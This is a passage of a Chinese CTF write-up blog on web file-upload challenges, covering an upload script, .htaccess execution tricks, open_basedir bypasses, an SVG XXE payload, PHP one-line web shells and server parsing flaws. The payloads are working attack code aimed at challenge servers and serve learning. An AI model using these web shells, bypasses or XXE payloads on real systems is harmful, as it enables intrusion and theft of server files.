<span class="title">upload</span>():</span></span><br><span class="line">    url=<span class="string">&#x27;http://cdae37cf-9516-4e37-b27a-61fba50f0d80.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&#x27;</span></span><br><span class="line">    filename=[<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;1.xxx&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> filename:</span><br><span class="line">        file=&#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(x,<span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">        req = requests.post(url=url, files=file)</span><br><span class="line">        print(req.content)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_htacess()</span><br><span class="line">    print(<span class="string">&quot;debug1&quot;</span>)</span><br><span class="line">    generate_php_file(<span class="string">&quot;1.xxx&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>) <span class="comment"># 此处好像有些许问题，&lt;?和ph应该都被过滤了，需要使用base64上传，并在.htaccess中设置自动baset64解码</span></span><br><span class="line">    print(<span class="string">&quot;debug2&quot;</span>)</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>
<p>尝试用蚁剑连接，提示无权访问</p>
<p>在phpinfo中可以看到，open_basedir的存在</p>
<p>尝试bypass open_basedir</p>
<p>绕过disable_function</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;chdir(%27tmp%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);readfile(%22&#x2F;THis_Is_tHe_F14g%22);</span><br></pre></td></tr></table></figure>
<p>或者利用蚁剑的disable_functions插件</p>
<h3 id="init-set绕过open-basedir"><a href="#init-set绕过open-basedir" class="headerlink" title="init_set绕过open_basedir"></a>init_set绕过open_basedir</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));</span><br></pre></td></tr></table></figure>
<h3 id="htaccess自解码base64"><a href="#htaccess自解码base64" class="headerlink" title=".htaccess自解码base64"></a>.htaccess自解码base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_adeee0c170ad4ffb110df0cde294aecd&#x2F;shell.ha</span><br></pre></td></tr></table></figure>
<h3 id="htaccess绕过exif-imagetype"><a href="#htaccess绕过exif-imagetype" class="headerlink" title=".htaccess绕过exif_imagetype"></a>.htaccess绕过exif_imagetype</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .xxx         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>


<h2 id="SVGMagic"><a href="#SVGMagic" class="headerlink" title="SVGMagic"></a>SVGMagic</h2><p>来源：BSidesCF2019</p>
<p>考察：SVG，XXE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;svgfile&quot;; filename&#x3D;&quot;1.svg&quot;</span><br><span class="line">Content-Type: image&#x2F;svf+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>


<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>可伸缩矢量图，是一种XML，使用.svg保存</p>
<p>栗子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span> //XML申明，规定SVF文件是否含有对外部文件的引用</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> </span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span> // 引用外部SVG DTD</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>   // 开启SVG标签，设置SVG文档宽度和高度</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>/&gt;</span>  // 创建圆</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> // 闭合SVG标签</span><br></pre></td></tr></table></figure>
<h3 id="SVG-的-XSS"><a href="#SVG-的-XSS" class="headerlink" title="SVG 的 XSS"></a>SVG 的 XSS</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/434168767_99907709">https://www.sohu.com/a/434168767_99907709</a></p>
<p>原理</p>
<p>​    SVG支持通过脚本语言动态访问和修改SVG内容，类似于HTML的DOM</p>
<h2 id="BabyUpload（未做）"><a href="#BabyUpload（未做）" class="headerlink" title="BabyUpload（未做）"></a>BabyUpload（未做）</h2><p>来源：HFCTF2020</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>) <span class="comment">// 最终目标</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            safe_delete(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$direction</span> = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);  <span class="comment">// 从脚本外部获取输入 filter_input(input_type,variable,filter,options)</span></span><br><span class="line"><span class="variable">$attr</span> = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_path</span> = <span class="string">&quot;/var/babyctf/&quot;</span>.<span class="variable">$attr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$attr</span>===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_path</span> .= <span class="string">&quot;/&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$direction</span> === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_path</span> .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir(<span class="variable">$dir_path</span>, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$upload_result</span> = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$upload_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$direction</span> === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize(<span class="variable">$file_path</span>));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$download_result</span> = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$download_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Avatar-Uploader（未做）"><a href="#Avatar-Uploader（未做）" class="headerlink" title="Avatar Uploader（未做）"></a>Avatar Uploader（未做）</h2><p>来源：HarekazeCTF2019</p>
<h2 id="getshell（未做）"><a href="#getshell（未做）" class="headerlink" title="getshell（未做）"></a>getshell（未做）</h2><p>来源：SUCTF 2019</p>
<h2 id="Upload-Labs（未做）"><a href="#Upload-Labs（未做）" class="headerlink" title="Upload Labs（未做）"></a>Upload Labs（未做）</h2><p>来源：SUCTF 2019</p>
<h2 id="Avatar-Uploader（未做）-1"><a href="#Avatar-Uploader（未做）-1" class="headerlink" title="Avatar Uploader（未做）"></a>Avatar Uploader（未做）</h2><p>来源：HarekazeCTF2019</p>
<h2 id="EzUpload（未做）"><a href="#EzUpload（未做）" class="headerlink" title="EzUpload（未做）"></a>EzUpload（未做）</h2><p>来源：D3CTF 2019</p>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;])?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;php&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>


<h2 id="web-server解析漏洞"><a href="#web-server解析漏洞" class="headerlink" title="web server解析漏洞"></a>web server解析漏洞</h2><p>参考：<a target="_blank" rel="noopener" href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>从右往左解析</p>
<h3 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h3><p>正常：<a target="_blank" rel="noopener" href="http://www.xxx.com/logo.jpg">www.xxx.com/logo.jpg</a><br>触发漏洞：<a target="_blank" rel="noopener" href="http://www.xxx.com/logo.asp;.jpg">www.xxx.com/logo.asp;.jpg</a><br>按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么logo.php;.jpg也会被当成PHP文件执行）   <br>b.文件夹类型<br>正常：<a target="_blank" rel="noopener" href="http://www.xxx.com/image/logo.jpg">www.xxx.com/image/logo.jpg</a><br>触发漏洞：<a target="_blank" rel="noopener" href="http://www.xxx.com/image.asp/logo.jpg">www.xxx.com/image.asp/logo.jpg</a><br>按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么image.php文件夹下的文件也会被当做PHP文件解析。）</p>
<h3 id="IIS-7-0"><a href="#IIS-7-0" class="headerlink" title="IIS 7.0"></a>IIS 7.0</h3><p>对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>a.一个是对任意文件名，在后面添加”/任意文件名.php”的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br>b.低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>open_basedir是PHP中设置为了防御PHP跨目录文件读写的方法，本质上是一些目录的集合</p>
<p>这个命题比较大，目前只掌握了init_set的绕过方法</p>
<h3 id="init-set"><a href="#init-set" class="headerlink" title="init_set"></a>init_set</h3><p>chdir数量根据具体环境修改，<strong>一般要求是如果再chdir一次就进入根目录为止，比如php文件的位置为/www/admin/localhost_80/wwwroot/html/下,那么就要使用五次chdir(“..”);</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;tmpdir&#39;);</span><br><span class="line">chdir(&#39;tmpdir&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">$a&#x3D;file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SVG上传"><a href="#SVG上传" class="headerlink" title="SVG上传"></a>SVG上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;svgfile&quot;; filename&#x3D;&quot;1.svg&quot;</span><br><span class="line">Content-Type: image&#x2F;svf+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="ckla3x5dj0000z0ushtnr0iis" data-title="CTF-Web-文件上传" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          CTF-wp-攻防世界reverse初级
        
      </div>
    </a>
  
  
    <a href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">CTF-Web-CTFer成长之路2.1</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%84%E5%88%92/" rel="tag">规划</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 17.5px;">基础课</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 12.5px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%A7%84%E5%88%92/" style="font-size: 12.5px;">规划</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 17.5px;">论文学习</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/30/%E6%91%98%E6%8A%84-Foundations-of-Cryptography/">摘抄-Foundations of Cryptography</a>
          </li>
        
          <li>
            <a href="/2021/03/30/%E6%91%98%E6%8A%84-%E8%BD%AC%E5%9E%8B%E4%B8%AD%E7%9A%84%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C/">摘抄-转型中的地方政府</a>
          </li>
        
          <li>
            <a href="/2021/03/26/%E8%A7%84%E5%88%92-21%E5%B9%B4/">规划-21年</a>
          </li>
        
          <li>
            <a href="/2021/03/26/%E8%A7%84%E5%88%92-21-26%E5%B9%B4/">规划-21-26年</a>
          </li>
        
          <li>
            <a href="/2021/03/24/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E6%B8%85%E5%8D%8EOS/">基础课-清华OS</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>